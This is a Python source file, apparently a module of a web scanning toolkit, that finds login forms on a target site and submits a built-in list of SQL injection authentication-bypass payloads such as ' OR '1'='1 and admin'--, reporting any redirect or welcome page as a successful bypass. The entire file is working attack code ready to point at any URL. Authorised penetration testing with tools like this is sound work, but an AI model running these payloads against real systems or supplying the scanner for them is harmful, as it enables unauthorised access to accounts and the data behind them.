#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
from urllib.parse import urljoin
from core.logger import log_info, log_success, log_warning, log_error, log_debug

class LoginBypassScanner:
    def __init__(self, target, verbose=False):
        self.target = target.rstrip('/')
        self.verbose = verbose
        self.payloads = [
            ("admin", "' OR '1'='1"),
            ("admin", "' OR 1=1--"),
            ("admin", "' OR 1=1#"),
            ("admin", "admin'--"),
            ("admin", "admin'#"),
            ("' OR '1'='1", "password"),
            ("admin", "password' OR '1'='1")
        ]

    def find_login_form(self, html):
        # Find action URL and input names
        form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*method=["\'](post|get)["\'][^>]*>(.*?)</form>'
        matches = re.findall(form_pattern, html, re.IGNORECASE | re.DOTALL)
        
        forms = []
        for action, method, content in matches:
            username_field = re.search(r'<input[^>]*name=["\']([^"\']*)["\'][^>]*type=["\'](text|email)["\'][^>]*>', content, re.IGNORECASE)
            password_field = re.search(r'<input[^>]*name=["\']([^"\']*)["\'][^>]*type=["\']password["\'][^>]*>', content, re.IGNORECASE)
            if username_field and password_field:
                forms.append({
                    "action": urljoin(self.target, action) if action else self.target,
                    "method": method.lower(),
                    "username": username_field.group(1),
                    "password": password_field.group(1)
                })
        return forms

    def test_login(self, form, username, password):
        data = {
            form["username"]: username,
            form["password"]: password
        }
        try:
            if form["method"] == "post":
                resp = requests.post(form["action"], data=data, timeout=10, allow_redirects=False)
            else:
                resp = requests.get(form["action"], params=data, timeout=10, allow_redirects=False)
            
            # Success indicators: redirect to dashboard, status 302, or different content
            if resp.status_code in [302, 301]:
                log_success(f"🔥 Login Bypass possible! {username}:{password} -> Redirect ({resp.status_code})")
                return True
            if "dashboard" in resp.text.lower() or "welcome" in resp.text.lower():
                log_success(f"🔥 Login Bypass possible! {username}:{password} -> Welcome page detected")
                return True
            if "login" not in resp.text.lower() and len(resp.text) > 100:
                log_success(f"🔥 Login Bypass possible! {username}:{password} -> Content changed")
                return True
            if self.verbose:
                log_debug(f"Failed: {username}:{password} -> {resp.status_code}")
        except Exception as e:
            if self.verbose:
                log_debug(f"Error: {e}")
        return False

    def run(self):
        log_info(f"Starting Login Bypass scan on: {self.target}")
        try:
            resp = requests.get(self.target, timeout=10)
            if resp.status_code != 200:
                log_error(f"Cannot fetch page. Status: {resp.status_code}")
                return {"target": self.target, "scan_type": "login_bypass", "forms": [], "success": False}
            
            forms = self.find_login_form(resp.text)
            if not forms:
                log_warning("No login form found on this page.")
                return {"target": self.target, "scan_type": "login_bypass", "forms": [], "success": False}
            
            log_info(f"Found {len(forms)} login form(s). Testing payloads...")
            for form in forms:
                log_info(f"Testing form action: {form['action']}")
                for username, password in self.payloads:
                    if self.test_login(form, username, password):
                        log_success(f"✅ Successful bypass with {username}:{password}")
                        return {"target": self.target, "scan_type": "login_bypass", "forms": forms, "success": True}
            
            log_warning("No login bypass found.")
            return {"target": self.target, "scan_type": "login_bypass", "forms": forms, "success": False}
        except Exception as e:
            log_error(f"Error: {e}")
            return {"target": self.target, "scan_type": "login_bypass", "error": str(e)}
